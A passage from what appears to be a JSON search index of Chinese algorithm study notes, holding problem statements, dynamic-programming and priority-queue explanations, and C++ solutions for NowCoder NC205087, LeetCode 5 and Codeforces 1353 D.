Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#13-memory-limit","text":"C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K","title":"1.3. Memory Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#14-problem-description","text":"\u725b\u59b9\u6b63\u5728\u73a9\u4e00\u4e2a\u6570\u5217\u4ed6\u624b\u91cc\u6709\u4e00\u4e2a\u957f\u5ea6\u4e3an\u7684\u5e8f\u5217a\uff0c\u4fdd\u8bc1\u5b83\u662f\u4e00\u4e2a01\u5e8f\u5217\uff0c\u5e76\u6267\u884c\u4ee5\u4e0b\u4e24\u79cd\u64cd\u4f5c\uff1a \u5355\u70b9\u4fee\u6539\uff1a\u5c06\u4f4d\u7f6ex\u4e0a\u7684\u6570\u7ffb\u8f6c\uff080\u53d81,1\u53d80\uff09 \u524d\u7f00\u4fee\u6539\uff1a\u5c06\u4f4d\u7f6e1~x\u4e0a\u7684\u6570\u7ffb\u8f6c\uff08\u6bcf\u4e2a\u6570\u90fd0\u53d81,1\u53d80\uff09\u3002\u4ed6\u73b0\u5728\u60f3\u8981\u6700\u5c0f\u5316\u7ffb\u8f6c\u6b21\u6570\uff0c\u4f7f\u5f97\u6570\u5217\u4e0a\u7684\u6240\u6709\u6570\u90fd\u53d8\u4e3a0\u3002","title":"1.4. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#15-input","text":"\u7b2c\u4e00\u884c\uff0c\u8f93\u5165\u4e00\u4e2a\u6570 n \u3002\u7b2c\u4e8c\u884c\uff0c\u8f93\u5165 n \u4e2a\u6570\uff0c\u7b2c i \u4e2a\u6570\u8868\u793a a_i \u3002","title":"1.5. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#16-output","text":"\u8f93\u51fa\u6700\u5c0f\u7ffb\u8f6c\u6b21\u6570\u3002","title":"1.6. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#17-sample-input","text":"10 1 0 1 1 0 0 0 1 0 0","title":"1.7. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#18-sample-output","text":"3","title":"1.8. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#19-note","text":"\u6570\u636e\u4fdd\u8bc1 1\\le n\\le 10^5,0\\le a_i\\le 1 \u3002","title":"1.9. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#110-source","text":"\u725b\u5ba2\u7f51 NC205087 \u725b\u59b9\u7231\u6570\u5217","title":"1.10. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#2","text":"\u9898\u89e3\u6765\u81ea \u51fa\u9898\u4eba\u7684\u725b\u5ba2\u535a\u5ba2 \u3002 \u8003\u8651\u52a8\u6001\u89c4\u5212\u3002 \u6211\u4eec\u5b9a\u4e49 dp[i][0/1] \u8868\u793a\u5f53\u524d\u7b2c i \u4e2a\u4f4d\u7f6e\uff0c\u5c06\u524d i \u4e2a\u4f4d\u7f6e\u5168\u53d8\u6210 0/1 \u7684\u6700\u5c11\u64cd\u4f5c\u6570\u3002 \u5982\u679c\u5f53\u524d\u4f4d\u7f6e\u4e0a a[i]=1 \uff0c\u5219\uff1a dp[i][0]=min(dp[i-1][0]+1,dp[i-1][1]+1) \uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 a[i] \u5355\u72ec\u7ffb\u8f6c\uff0c\u4e5f\u53ef\u4ee5\u5c06\u8fd9\u524d\u7f00 1 \u4e00\u8d77\u7ffb\u8f6c\uff1b dp[i][1]=min(dp[i-1][1],dp[i-1][0]+1) \uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u524d\u7f00 0 \u7ffb\u8f6c\uff0c\u7136\u540e\u628a a[i] \u62fc\u4e0a\u53bb\u3002 \u5982\u679c\u5f53\u524d\u4f4d\u7f6e\u4e0a a[i]=0 \uff0c\u5219\uff1a dp[i][0]=min(dp[i-1][0],dp[i-1][1]+1) \uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u524d\u7f00 1 \u7ffb\u8f6c\uff0c\u7136\u540e\u628a a[i] \u62fc\u4e0a\u53bb\uff1b dp[i][1]=min(dp[i-1][0]+1,dp[i-1][1]+1) \uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 a[i] \u5355\u72ec\u7ffb\u8f6c\uff0c\u4e5f\u53ef\u4ee5\u5c06\u8fd9\u524d\u7f00 0 \u4e00\u8d77\u7ffb\u8f6c\uff1b \u7b54\u6848\u8bb0\u4e3a min(dp[n][0],dp[n][1]) \u3002 \u65f6\u95f4\u590d\u6742\u5ea6\uff1a O(n) \u3002","title":"2. \u9898\u89e3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC205087_%E7%89%9B%E5%A6%B9%E7%88%B1%E6%95%B0%E5%88%97/#3","text":"#include <iostream> using namespace std; const int N = 100005; int a[N], dp[N][2] = {0}, n; int main() { cin >> n; for (int i = 1; i <= n; i++) { cin >> a[i]; } for (int i = 1; i <= n; i++) { if (a[i] == 1) { dp[i][0] = min(dp[i - 1][0] + 1, dp[i - 1][1] + 1); dp[i][1] = min(dp[i - 1][1], dp[i - 1][0] + 1); } else { dp[i][0] = min(dp[i - 1][0], dp[i - 1][1] + 1); dp[i][1] = min(dp[i - 1][0] + 1, dp[i - 1][1] + 1); } } printf(\"%d\\n\", dp[n][0]); return 0; } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/2.LeetCode_5_%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/","text":"LeetCode 5 \u6700\u957f\u56de\u6587\u5b50\u4e32 # \u76ee\u5f55 # LeetCode 5 \u6700\u957f\u56de\u6587\u5b50\u4e32 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u7ed9\u5b9a\u4e00\u4e2a\u5b57\u7b26\u4e32 s \uff0c\u627e\u5230 s \u4e2d\u6700\u957f\u7684\u56de\u6587\u5b50\u4e32\u3002\u4f60\u53ef\u4ee5\u5047\u8bbe s \u7684\u6700\u5927\u957f\u5ea6\u4e3a 1000\u3002 1.3. Sample Input 1 # \u8f93\u5165: \"babad\" 1.4. Sample Output 1 # \u8f93\u51fa: \"bab\" \u6ce8\u610f: \"aba\" \u4e5f\u662f\u4e00\u4e2a\u6709\u6548\u7b54\u6848\u3002 1.5. Sample Input 2 # \u8f93\u5165: \"cbbd\" 1.6. Sample Output 2 # \u8f93\u51fa: \"bb\" 1.7. Source # LeetCode 5 \u6700\u957f\u56de\u6587\u5b50\u4e32 2. \u89e3\u8bfb # dp[i][j] \u8868\u793a s[i , j + 1] \u8fd9\u4e2a\u5b50\u4e32\u662f\u4e0d\u662f\u4e00\u4e2a\u56de\u6587\u4e32\u3002 len = j - i \uff0c len + 1 \u8868\u793a\u5b50\u4e32\u7684\u957f\u5ea6\u3002 \u82e5 len == 0 \uff0c\u5373\u957f\u5ea6\u4e3a 1 \uff0c\u90fd\u6ee1\u8db3\u56de\u6587\u4e32\u6761\u4ef6\u3002 \u82e5 len = 1 \uff0c\u5373\u957f\u5ea6\u4e3a 2 \uff0c\u5f53\u9996\u5c3e\u76f8\u7b49\u65f6\u6ee1\u8db3\u6761\u4ef6, dp[i][j] = 1 \uff0c\u4e0d\u76f8\u7b49\u65f6 dp[i][j] = 0 \u3002 \u82e5 len >= 2 \uff0c\u5373\u957f\u5ea6\u5927\u4e8e\u7b49\u4e8e 3 \uff0c\u9996\u5c3e\u76f8\u7b49\u65f6\u9012\u63a8\u8ba1\u7b97\uff0c\u4e0d\u76f8\u7b49\u65f6 dp[i][j] = 0 \u3002 \u9012\u63a8\u65b9\u7a0b dp[i][j] = dp[i + 1][j - 1] \uff0c\u8868\u793a\u5982\u679c\u5b50\u4e32 buf = s[i , j + 1] \u9996\u4f4d\u76f8\u7b49\uff0c\u5219\u53ea\u8981\u53bb\u6389 buf \u7684\u9996\u5c3e\u7aef\u70b9\u540e\u7684\u5b50\u4e32 s[i + 1 , j] \u662f\u56de\u6587\u4e32\uff0c\u90a3\u4e48 buf \u4e00\u5b9a\u662f\u56de\u6587\u4e32\u3002 \u4ee3\u7801\u53c2\u8003\u81ea \u5b98\u65b9\u9898\u89e3 \u3002 3. \u4ee3\u7801 # class Solution { public: string longestPalindrome(string s) { const int MAXM = 1e3 + 1; int dp[MAXM][MAXM] = { { 0 } }; int n = s.size(); string ans; // \u904d\u5386\u957f\u5ea6len for (int len = 0; len < n; ++len) { // \u904d\u5386\u4f4d\u7f6ei for (int i = 0; i + len < n; ++i) { // \u83b7\u53d6\u7ed3\u675f\u4f4d\u7f6ej int j = i + len; // \u5224\u65ad\u957f\u5ea6 if (len == 0) { // \u82e5len = 0\uff0c\u5373\u957f\u5ea6\u4e3a1\uff0c\u90fd\u6ee1\u8db3\u6761\u4ef6 dp[i][j] = 1; } else if (len == 1) { // \u82e5len = 1\uff0c\u5373\u957f\u5ea6\u4e3a2\uff0c\u5f53\u9996\u5c3e\u76f8\u7b49\u65f6\u6ee1\u8db3\u6761\u4ef6 dp[i][j] = (s[i] == s[j]); } else { // \u957f\u5ea6\u5927\u4e8e\u7b49\u4e8e3\uff0c\u9996\u5c3e\u76f8\u7b49\u65f6\u9012\u63a8\u8ba1\u7b97 // \u9996\u5c3e\u4e0d\u76f8\u7b49\u65f6\u9ed8\u8ba4\u4e3afalse dp[i][j] = (s[i] == s[j] && dp[i + 1][j - 1]); } // \u83b7\u53d6\u6700\u5927\u957f\u5ea6 if (dp[i][j] && len + 1 > ans.size()) { ans = s.substr(i, len + 1); } } } return ans; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.LeetCode 5 \u6700\u957f\u56de\u6587\u5b50\u4e32"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/2.LeetCode_5_%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/#leetcode-5","text":"","title":"LeetCode 5 \u6700\u957f\u56de\u6587\u5b50\u4e32"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/2.LeetCode_5_%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/#_1","text":"LeetCode 5 \u6700\u957f\u56de\u6587\u5b50\u4e32 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/2.LeetCode_5_%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/2.LeetCode_5_%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/2.LeetCode_5_%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/#12-problem-description","text":"\u7ed9\u5b9a\u4e00\u4e2a\u5b57\u7b26\u4e32 s \uff0c\u627e\u5230 s \u4e2d\u6700\u957f\u7684\u56de\u6587\u5b50\u4e32\u3002\u4f60\u53ef\u4ee5\u5047\u8bbe s \u7684\u6700\u5927\u957f\u5ea6\u4e3a 1000\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/2.LeetCode_5_%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/#13-sample-input-1","text":"\u8f93\u5165: \"babad\"","title":"1.3. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/2.LeetCode_5_%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/#14-sample-output-1","text":"\u8f93\u51fa: \"bab\" \u6ce8\u610f: \"aba\" \u4e5f\u662f\u4e00\u4e2a\u6709\u6548\u7b54\u6848\u3002","title":"1.4. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/2.LeetCode_5_%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/#15-sample-input-2","text":"\u8f93\u5165: \"cbbd\"","title":"1.5. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/2.LeetCode_5_%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/#16-sample-output-2","text":"\u8f93\u51fa: \"bb\"","title":"1.6. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/2.LeetCode_5_%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/#17-source","text":"LeetCode 5 \u6700\u957f\u56de\u6587\u5b50\u4e32","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/2.LeetCode_5_%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/#2","text":"dp[i][j] \u8868\u793a s[i , j + 1] \u8fd9\u4e2a\u5b50\u4e32\u662f\u4e0d\u662f\u4e00\u4e2a\u56de\u6587\u4e32\u3002 len = j - i \uff0c len + 1 \u8868\u793a\u5b50\u4e32\u7684\u957f\u5ea6\u3002 \u82e5 len == 0 \uff0c\u5373\u957f\u5ea6\u4e3a 1 \uff0c\u90fd\u6ee1\u8db3\u56de\u6587\u4e32\u6761\u4ef6\u3002 \u82e5 len = 1 \uff0c\u5373\u957f\u5ea6\u4e3a 2 \uff0c\u5f53\u9996\u5c3e\u76f8\u7b49\u65f6\u6ee1\u8db3\u6761\u4ef6, dp[i][j] = 1 \uff0c\u4e0d\u76f8\u7b49\u65f6 dp[i][j] = 0 \u3002 \u82e5 len >= 2 \uff0c\u5373\u957f\u5ea6\u5927\u4e8e\u7b49\u4e8e 3 \uff0c\u9996\u5c3e\u76f8\u7b49\u65f6\u9012\u63a8\u8ba1\u7b97\uff0c\u4e0d\u76f8\u7b49\u65f6 dp[i][j] = 0 \u3002 \u9012\u63a8\u65b9\u7a0b dp[i][j] = dp[i + 1][j - 1] \uff0c\u8868\u793a\u5982\u679c\u5b50\u4e32 buf = s[i , j + 1] \u9996\u4f4d\u76f8\u7b49\uff0c\u5219\u53ea\u8981\u53bb\u6389 buf \u7684\u9996\u5c3e\u7aef\u70b9\u540e\u7684\u5b50\u4e32 s[i + 1 , j] \u662f\u56de\u6587\u4e32\uff0c\u90a3\u4e48 buf \u4e00\u5b9a\u662f\u56de\u6587\u4e32\u3002 \u4ee3\u7801\u53c2\u8003\u81ea \u5b98\u65b9\u9898\u89e3 \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8C%BA%E9%97%B4DP/2.LeetCode_5_%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/#3","text":"class Solution { public: string longestPalindrome(string s) { const int MAXM = 1e3 + 1; int dp[MAXM][MAXM] = { { 0 } }; int n = s.size(); string ans; // \u904d\u5386\u957f\u5ea6len for (int len = 0; len < n; ++len) { // \u904d\u5386\u4f4d\u7f6ei for (int i = 0; i + len < n; ++i) { // \u83b7\u53d6\u7ed3\u675f\u4f4d\u7f6ej int j = i + len; // \u5224\u65ad\u957f\u5ea6 if (len == 0) { // \u82e5len = 0\uff0c\u5373\u957f\u5ea6\u4e3a1\uff0c\u90fd\u6ee1\u8db3\u6761\u4ef6 dp[i][j] = 1; } else if (len == 1) { // \u82e5len = 1\uff0c\u5373\u957f\u5ea6\u4e3a2\uff0c\u5f53\u9996\u5c3e\u76f8\u7b49\u65f6\u6ee1\u8db3\u6761\u4ef6 dp[i][j] = (s[i] == s[j]); } else { // \u957f\u5ea6\u5927\u4e8e\u7b49\u4e8e3\uff0c\u9996\u5c3e\u76f8\u7b49\u65f6\u9012\u63a8\u8ba1\u7b97 // \u9996\u5c3e\u4e0d\u76f8\u7b49\u65f6\u9ed8\u8ba4\u4e3afalse dp[i][j] = (s[i] == s[j] && dp[i + 1][j - 1]); } // \u83b7\u53d6\u6700\u5927\u957f\u5ea6 if (dp[i][j] && len + 1 > ans.size()) { ans = s.substr(i, len + 1); } } } return ans; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%8E%92%E5%BA%8F/1.CodeForces_1353_D_Constructing_the_Array/","text":"CodeForces 1353 D. Constructing the Array # \u76ee\u5f55 # CodeForces 1353 D. Constructing the Array \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Onput 1.5. Sample Input 1.6. Sample Onput 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1 second Memory Limit: 256 megabytes 1.2. Problem Description # You are given an array a of length n consisting of zeros. You perform n actions with this array: during the i -th action, the following sequence of operations appears: Consider the array a of length 5 (initially a=[0, 0, 0, 0, 0] ). Then it changes as follows: Firstly, we choose the segment [1; 5] and assign a[3] := 1 , so a becomes [0, 0, 1, 0, 0] ; then we choose the segment [1; 2] and assign a[1] :=2 , so a becomes [2, 0, 1, 0, 0] ; then we choose the segment [4; 5] and assign a[4] := , so a becomes [2, 0, 1, 3, 0] ; then we choose the segment [2; 2] and assign a[2] :=4 , so a becomes [2, 4, 1, 3, 0] ; and at last we choose the segment [5; 5] and assign a[5] := 5 , so a becomes [2, 4, 1, 3, 5] . Your task is to find the array a of length n after performing all n actions. Note that the answer exists and unique . You have to answer t independent test cases. 1.3. Input # The first line of the input contains one integer t ( 1 \\le t \\le 10^4 ) \u2014 the number of test cases. Then t test cases follow. The only line of the test case contains one integer n ( 1 \\le n \\le 2 \\cdot 10^5 ) \u2014 the length of a . It is guaranteed that the sum of n over all test cases does not exceed 2 \\cdot 10^5 ( \\sum n \\le 2 \\cdot 10^5 ). 1.4. Onput # For each test case, print the answer \u2014 the array a of length n after performing n actions described in the problem statement. Note that the answer exists and unique . 1.5. Sample Input # 6 1 2 3 4 5 6 1.6. Sample Onput # 1 1 2 2 1 3 3 1 2 4 2 4 1 3 5 3 4 1 5 2 6 1.7. Source # CodeForces 1353 D. Constructing the Array 2. \u89e3\u8bfb # \u7528\u4f18\u5148\u961f\u5217 priority_queue \u6839\u636e\u533a\u95f4\u957f\u5ea6\u6784\u9020\u5927\u9876\u5806\u3002 \u6bcf\u6b21\u53d6\u51fa\u5806\u9876\u7684\u533a\u95f4\u5143\u7d20\u8fdb\u884c\u8d4b\u503c\uff0c\u6bcf\u6b21\u8d4b\u503c\u5b8c\u4ee5\u540e\uff0c\u5c06\u5de6\u5b50\u533a\u95f4\u548c\u53f3\u5b50\u533a\u95f4\u653e\u5165\u5806\u4e2d\u3002\u548c\u5206\u6cbb\u6cd5\u7684\u601d\u60f3\u6bd4\u8f83\u7c7b\u4f3c\u3002 \u91cd\u590d\u4ee5\u4e0a\u6b65\u9aa4\u76f4\u5230\u5806\u4e3a\u7a7a\u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> #include <queue> #include <string.h> const long long num = 2 * 1e5 + 1; using namespace std; // \u5b9a\u4e49\u6570\u636e\u7c7b\u578b #define llpair pair<long long, long long> // \u5b58\u50a8 long long list[num]; // \u6807\u8bb0\u5f53\u524d\u6570\u5b57\u4e2a\u6570 long long markNum; // \u961f\u5217\u957f\u5ea6 long long n; // \u5b9a\u4e49\u6392\u5e8f\u65b9\u6cd5 struct cmp { bool operator()(llpair a, llpair b) { if ((a.second - a.first) != (b.second - b.first)) { // \u8fd4\u56de\u5c0f\u4e8e\u5224\u65ad\u65f6\uff0c\u662f\u5927\u9876\u5806\uff0c\u4e0equeue\u76f8\u53cd return (a.second - a.first) < (b.second - b.first); } else { // \u8fd4\u56de\u5927\u4e8e\u53f7\u65f6\uff0c\u8f83\u5c0f\u7684\u5143\u7d20\u5728\u524d return a.first > b.first; } } }; // \u4f7f\u7528\u4f18\u5148\u961f\u5217\u6784\u9020\u5927\u9876\u5806 priority_queue<llpair, vector<llpair>, cmp> qu; // \u5b9a\u4e49\u6e05\u96f6\u51fd\u6570 void clear(priority_queue<llpair, vector<llpair>, cmp>& q) { priority_queue<llpair, vector<llpair>, cmp> empty; swap(empty, q); } // \u5206\u6cbb\u6cd5 void divideAndConquer(long long array[]) { while (!qu.empty()) { // \u83b7\u53d6\u6700\u5927\u533a\u95f4 llpair pairBuffer = qu.top(); // \u51fa\u961f qu.pop(); // \u83b7\u53d6\u961f\u9996\u5143\u7d20 long long low = pairBuffer.first; long long high = pairBuffer.second; // \u8ba1\u7b97\u4e2d\u503c long long mid = low + (high - low) / 2; if (low <= high && mid > 0 && array[mid] == 0) { array[mid] = markNum; markNum++; } // \u5165\u961f if (low <= mid - 1) qu.push(make_pair(low, mid - 1)); if (mid + 1 <= high) qu.push(make_pair(mid + 1, high)); } } int main() { // test case long long t; // long long n; // test case scanf(\"%lld\", &t); // for each test case while (t--) { // \u521d\u59cb\u5316 markNum = 1; memset(list, 0, sizeof(list)); clear(qu); // \u8f93\u5165 scanf(\"%lld\", &n); // \u8ba1\u7b97 qu.push(make_pair(1, n)); divideAndConquer(list); // \u8f93\u51fa for (int i = 1; i <= n; i++) { printf(\"%lld \", list[i]); } printf(\"\\n\"); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.CodeForces 1353 D Constructing the Array"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%A0%86%E6%8E%92%E5%BA%8F/1.CodeForces_1353_D_Constructing_the_Array/#codeforces-1353-d-constructing-the-array","text":"","title":"CodeForces 1353 D. Constructing the 